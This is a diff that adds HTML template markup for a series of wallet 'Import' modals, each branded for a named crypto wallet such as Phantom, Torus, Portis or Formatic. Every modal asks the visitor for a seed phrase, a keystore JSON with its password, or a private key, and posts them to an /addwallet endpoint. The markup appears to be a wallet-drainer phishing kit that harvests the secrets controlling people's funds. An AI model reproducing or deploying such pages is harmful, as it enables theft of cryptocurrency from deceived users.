+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="coinbase">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="formaticModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/formatic.png ') }} alt="">
+                                </div>                             
+                                {{ url_for('static', path='public/assets/img/wallets/formatic.png ') }}
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="formatic">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="glowModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/glow.png') }}" alt="">
+                                </div>                             
+                                
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="glow">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="operatouchModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="https://demo8.codesremedy.com.ng/public/assets/img/wallets/operatouch.png" alt="">
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="operatouch">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div> 
+                        
+                        <div class="modal fade" id="phantomModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="../public/assets/img/wallets/phantom.png" alt="">
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="phantom">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="portisModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="https://demo8.codesremedy.com.ng/public/assets/img/wallets/portis.png" alt="">
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="portis">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="randomwalletModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="../public/assets/img/wallets/randomwallet.png" alt="">
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="method" placeholder="Name of prefered wallet">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="venly">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="torusModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="https://demo8.codesremedy.com.ng/public/assets/img/wallets/torus.png" alt="">
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="torus">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="blockchainModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="../public/assets/img/wallets/blockchain.png" alt="">
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="blockchain">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
